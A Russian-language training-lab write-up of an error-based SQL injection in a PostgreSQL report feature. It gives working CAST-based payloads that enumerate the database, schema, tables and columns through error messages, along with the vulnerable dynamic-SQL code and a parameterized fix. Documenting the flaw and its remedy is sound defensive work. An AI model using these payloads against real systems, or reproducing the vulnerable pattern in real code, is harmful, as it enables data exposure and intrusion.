# Error-based SQL-инъекции

## 1. Тип уязвимости

Тип уязвимости — Error-based SQL Injection.

Это SQL-инъекция, при которой злоумышленник специально вызывает ошибку базы данных, а сайт выводит текст этой ошибки. Через такие ошибки можно узнать техническую информацию о базе: текущую БД, текущую схему, количество таблиц, названия таблиц и колонки.

## 2. Результат уязвимости

В разделе пользовательских SQL-отчетов было найдено поле `WHERE fragment`, куда можно ввести собственное условие фильтрации для отчета. В демонстрации сначала в поле было введено условие с одинарным апострофом: `u.username = 'alice`. После запуска отчета сайт показал внутреннюю ошибку PostgreSQL: `unterminated quoted string at or near "'alice ORDER BY i.id"`. Это подтвердило, что введенный текст попадает внутрь SQL-запроса и что приложение показывает пользователю реальные ошибки базы данных.

![Демонстрация error-based SQL-инъекции](./error_based.gif)

Затем было введено обычное условие `1=1`, и отчет вернул строки с данными: клиентов, суммы, владельцев и части номеров карт. После этого через специально подобранные выражения с `CAST(... AS INT)` удалось заставить PostgreSQL выводить служебные данные прямо в тексте ошибки. Например, при запросе текущей базы данных сайт показал ошибку `invalid input syntax for type integer: "training_lab"`.

Дальше в демонстрации через такие же ошибки были получены сведения о структуре базы:

- текущая база данных: `training_lab`;
- количество пользовательских таблиц - 5;
- названия таблиц, например `training.app_users`, `training.customers`, `training.sessions`;
- названия колонок и их типы в таблице `training.app_users`, например `id:uuid`, `username:text`, `role:text`.

Это опасно, потому что:

- пользователь видит внутренние SQL-ошибки;
- можно постепенно узнавать структуру базы данных;
- можно получить сведения о схемах, таблицах и колонках;
- такая информация помогает развивать атаку дальше.

## 3. Как была найдена уязвимость

1. Сначала в поле отчета был введен одинарный апостроф, чтобы проверить, ломается ли SQL-синтаксис:

```sql
'
```

В демонстрации это проявилось через условие:

```sql
u.username = 'alice
```

Сайт показал ошибку базы данных:

```text
unterminated quoted string at or near "'alice ORDER BY i.id"
```

2. Затем было введено простое истинное условие, чтобы проверить, можно ли управлять фильтром отчета:

```sql
1=1
```

После запуска отчета появились строки с данными, значит введенный фрагмент действительно использовался как часть SQL-условия.

3. После этого был использован payload с `CAST`, который пытается привести текстовое имя текущей базы данных к числу. PostgreSQL не может преобразовать строку в `INT` и выводит эту строку в ошибке:

```sql
1=CAST((SELECT current_database()) AS INT)
```

В результате сайт показал:

```text
invalid input syntax for type integer: "training_lab"
```

4. По такому же принципу была проверена текущая схема:

```sql
1=CAST((SELECT current_schema()) AS INT)
```

5. Затем через ошибку было получено количество таблиц вне системных схем:

```sql
1=CAST((SELECT 'count=' || COUNT(*)::text FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')) AS INT)
```

6. После этого таблицы перебирались через `information_schema.tables` с `LIMIT 1 OFFSET ...`. В демонстрации менялся `OFFSET`, а ошибка раскрывала очередное имя таблицы:

```sql
1=CAST((SELECT table_schema || '.' || table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') ORDER BY table_schema, table_name LIMIT 1 OFFSET 0) AS INT)
```

Например, в ошибках были видны:

```text
training.app_users
training.customers
training.sessions
```

7. Затем таким же способом перебирались колонки таблицы `training.app_users` через `information_schema.columns`:

```sql
1=CAST((SELECT column_name || ':' || data_type FROM information_schema.columns WHERE table_schema='training' AND table_name='app_users' ORDER BY ordinal_position LIMIT 1 OFFSET 0) AS INT)
```

В демонстрации при изменении `OFFSET` сайт показывал в ошибках разные колонки:

```text
id:uuid
username:text
role:text
```

На скриншотах из этой же папки видно, где находилась причина уязвимости и как она исправлялась. Сначала пользовательский фрагмент `WHERE` передавался в отчет и ошибка базы возвращалась пользователю как текст:

### Код до исправления

В серверной функции отчет принимал строку `whereClause` и передавал ее в SQL-функцию без проверки структуры условия:

```typescript
export async function runCustomReport(whereClause: string) {
    if (!whereClause.trim()) {
        error(400, 'WHERE clause is required');
    }

    const result = await pool.query('SELECT * FROM training.run_custom_report($1)', [whereClause]);
    return result.rows;
}
```

Обработчик страницы брал это значение из формы и при ошибке возвращал пользователю текст исключения. Из-за этого сообщения PostgreSQL становились частью ответа страницы:

```typescript
const form = await request.formData();
const whereClause = String(form.get('whereClause') ?? '').trim();

try {
    const results = await runCustomReport(whereClause);

    return {
        results,
        whereClause
    };
} catch (err) {
    return fail(400, {
        whereClause,
        error: err instanceof Error ? err.message : 'Не удалось сформировать отчет'
    });
}
```

В базе данных основная уязвимость была в динамическом SQL: `raw_where_clause` подставлялся в строку запроса как готовый фрагмент `WHERE`.

```sql
CREATE OR REPLACE FUNCTION training.run_custom_report(raw_where_clause text)
RETURNS TABLE (
    customer_name text,
    amount numeric,
    owner_name text,
    card_hint text
)
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
    RETURN QUERY EXECUTE format(
        'SELECT c.full_name, i.amount, u.full_name, i.card_hint
         FROM training.invoices i
         JOIN training.customers c ON c.id = i.customer_id
         JOIN training.app_users u ON u.id = i.owner_user_id
         WHERE %s
         ORDER BY i.id',
        raw_where_clause
    );
END;
$$;
```

![Передача пользовательского условия в отчет](<./Снимок экрана 2026-05-26 в 2.24.28 PM.png>)

![Возврат сообщения ошибки пользователю](<./Снимок экрана 2026-05-26 в 2.24.22 PM.png>)

Основная проблема была в функции отчета в базе данных: `raw_where_clause` подставлялся в SQL через `format(... WHERE %s ...)`, то есть пользовательский ввод становился частью SQL-команды:

![Уязвимая функция отчета в базе данных](<./Снимок экрана 2026-05-26 в 2.25.00 PM.png>)

После исправления отчет стал принимать отдельные параметры фильтрации, а не произвольный SQL-фрагмент. В серверном коде появились разрешенные статусы и параметризованный вызов функции:

### Код после исправления

Сервер больше не принимает произвольный `WHERE`. Вместо этого он работает со структурой фильтров и проверяет статус по списку разрешенных значений:

```typescript
const ALLOWED_REPORT_STATUSES = new Set(['paid', 'overdue', 'pending', 'draft']);

export type ReportFilters = {
    ownerUsername?: string;
    status?: string;
};

export async function runCustomReport(filters: ReportFilters) {
    const ownerUsername = filters.ownerUsername?.trim() || null;
    const status = filters.status?.trim().toLowerCase() || null;

    if (status && !ALLOWED_REPORT_STATUSES.has(status)) {
        error(400, 'Некорректный статус счета');
    }

    const result = await pool.query(
        `
            SELECT *
            FROM training.run_custom_report($1::text, $2::text)
        `,
        [ownerUsername, status]
    );

    return result.rows;
}
```

Обработчик формы тоже читает только конкретные поля, а в `catch` возвращает общее сообщение, не раскрывая текст ошибки базы:

```typescript
const ownerUsername = String(form.get('ownerUsername') ?? '').trim();
const status = String(form.get('status') ?? '').trim().toLowerCase();

try {
    const results = await runCustomReport({ ownerUsername, status });

    return {
        results,
        filters: { ownerUsername, status }
    };
} catch {
    return fail(400, {
        filters: { ownerUsername, status },
        error: 'Не удалось сформировать отчет'
    });
}
```

В SQL-функции вместо `raw_where_clause` используются обычные параметры. Запрос статический, поэтому введенный пользователем текст не исполняется как SQL-код:

```sql
DROP FUNCTION IF EXISTS training.run_custom_report(text);

CREATE OR REPLACE FUNCTION training.run_custom_report(
    p_owner_username text DEFAULT NULL,
    p_status text DEFAULT NULL
)
RETURNS TABLE (
    customer_name text,
    amount numeric,
    owner_name text,
    card_hint text
)
LANGUAGE sql
SECURITY INVOKER
AS $$
    SELECT
        c.full_name,
        i.amount,
        u.full_name,
        i.card_hint
    FROM training.invoices i
    JOIN training.customers c ON c.id = i.customer_id
    JOIN training.app_users u ON u.id = i.owner_user_id
    WHERE
        (NULLIF(p_owner_username, '') IS NULL OR u.username = p_owner_username)
        AND
        (NULLIF(p_status, '') IS NULL OR i.status = p_status)
    ORDER BY i.id;
$$;
```

![Параметризованный вызов отчета](<./Снимок экрана 2026-05-26 в 2.22.52 PM.png>)

Также в базе функция отчета была переписана так, чтобы использовать обычные параметры `p_owner_username` и `p_status`, а не исполнять строку с произвольным `WHERE`:

![Исправленная функция отчета в базе данных](<./Снимок экрана 2026-05-26 в 2.25.22 PM.png>)

Для сравнения также показан исходный вызов отчета, через который пользовательский фрагмент попадал в функцию:

![Исходный вызов отчета](<./Снимок экрана 2026-05-26 в 2.22.27 PM.png>)
